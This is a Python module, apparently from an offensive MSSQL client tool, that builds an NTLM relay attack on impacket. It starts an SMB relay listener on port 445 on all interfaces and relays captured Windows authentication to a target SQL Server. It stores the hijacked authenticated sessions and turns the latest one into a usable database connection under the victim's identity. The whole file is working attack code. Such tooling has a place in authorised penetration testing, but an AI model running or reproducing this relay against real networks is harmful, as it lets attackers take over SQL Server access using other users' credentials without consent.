# Built-in imports
import sys
import time
from typing import Optional

# Third party imports
from loguru import logger

from impacket.examples.ntlmrelayx.clients.mssqlrelayclient import MSSQLRelayClient
from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS, ProtocolAttack
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig

# Local library imports
from mssqlclientng.src.services.database import DatabaseContext
from mssqlclientng.src.models.server import Server


class CustomMSSQLAttack(ProtocolAttack):
    """
    Custom MSSQL attack that captures authenticated clients for DatabaseContext.
    """

    PLUGIN_NAMES = ["MSSQL"]
    captured_clients = []

    def __init__(self, config, MSSQLclient, username, target=None, relay_client=None):
        ProtocolAttack.__init__(
            self, config, MSSQLclient, username, target, relay_client
        )

    def run(self):
        """Capture authenticated client after successful relay."""
        logger.success(
            f"Successfully relayed authentication for {self.domain}\\{self.username}"
        )
        logger.info(f"Target: {self.target.hostname if self.target else 'Unknown'}")

        connection_info = {
            "client": self.client,
            "username": self.username,
            "domain": self.domain,
            "target": self.target,
        }

        CustomMSSQLAttack.captured_clients.append(connection_info)
        logger.success(
            f"Captured authenticated MSSQL client (total: {len(CustomMSSQLAttack.captured_clients)})"
        )
        logger.info("Attack completed - connection is ready for use")
        return True

    @classmethod
    def get_latest_client(cls):
        """Get the most recently captured authenticated client."""
        return cls.captured_clients[-1] if cls.captured_clients else None

    @classmethod
    def clear_clients(cls):
        """Clear all captured clients."""
        cls.captured_clients.clear()


class RelayMSSQL:

    def __init__(self, hostname: str):
        self.relay_servers = []
        self.threads = set()

        # Only register MSSQL protocol client (avoid loading all protocols)
        minimal_protocol_clients = {"MSSQL": MSSQLRelayClient}

        logger.info("Starting NTLM Relay listener")
        self.targets_processor = TargetsProcessor(
            singleTarget=f"mssql://{hostname}",
            protocolClients=minimal_protocol_clients,
        )
        self.relay_servers.append(SMBRelayServer)

        # Register custom attack
        PROTOCOL_ATTACKS["MSSQL"] = CustomMSSQLAttack
        logger.debug("Registered CustomMSSQLAttack for MSSQL protocol")

    def start(self, smb2support: bool = False, ntlmchallenge: str = None):
        # Only use MSSQL protocol client
        minimal_protocol_clients = {"MSSQL": MSSQLRelayClient}

        for server in self.relay_servers:
            # Set up config
            c = NTLMRelayxConfig()

            c.setProtocolClients(minimal_protocol_clients)
            c.setTargets(self.targets_processor)
            c.setExeFile(None)
            c.setCommand(None)
            c.setEnumLocalAdmins(None)
            c.setAddComputerSMB(None)
            c.setDisableMulti(None)
            c.setKeepRelaying(False)
            c.setEncoding(sys.getdefaultencoding())
            c.setMode("RELAY")
            c.setAttacks(PROTOCOL_ATTACKS)
            c.setLootdir(".")
            c.setOutputFile(None)
            c.setdumpHashes(False)
            c.setSMB2Support(smb2support)
            c.setSMBChallenge(ntlmchallenge)
            c.setInterfaceIp("0.0.0.0")

            if server is SMBRelayServer:
                c.setListeningPort(445)

            s = server(c)
            s.start()
            self.threads.add(s)
        return c

    def wait_for_connection(
        self, timeout: int = 60, database: str = "master"
    ) -> Optional[DatabaseContext]:
        """
        Wait for a relayed connection and create a DatabaseContext from it.

        Args:
            timeout: Maximum seconds to wait for a connection
            database: Database to connect to

        Returns:
            DatabaseContext instance or None if no connection captured
        """
        logger.info(f"Waiting up to {timeout} seconds for relayed connection")

        start_time = time.time()
        while time.time() - start_time < timeout:
            client_info = CustomMSSQLAttack.get_latest_client()

            if client_info:
                logger.success("Relayed connection captured!")
                return self._create_database_context(client_info, database)

            time.sleep(0.5)

        logger.warning(f"No relayed connection received within {timeout} seconds")
        return None

    def _create_database_context(
        self, client_info: dict, database: str
    ) -> DatabaseContext:
        """Convert captured relay client into DatabaseContext."""
        mssql_client = client_info["client"]
        username = client_info["username"]
        domain = client_info["domain"]
        target = client_info["target"]

        hostname = target.hostname if target else "Unknown"
        port = (
            target.port if target and hasattr(target, "port") and target.port else 1433
        )

        server = Server(
            hostname=hostname, port=port, database=database, impersonation_user=None
        )

        logger.info(f"Creating DatabaseContext for {domain}\\{username}@{hostname}")
        db_context = DatabaseContext(server=server, mssql_instance=mssql_client)

        db_context.server.mapped_user = f"{domain}\\{username}" if domain else username
        logger.success("DatabaseContext created successfully")

        return db_context

    def stop_servers(self):
        """Stop all relay servers."""
        todelete = []
        for thread in self.threads:
            if isinstance(thread, tuple(self.relay_servers)):
                thread.server.shutdown()
                todelete.append(thread)
        for thread in todelete:
            self.threads.remove(thread)
            del thread
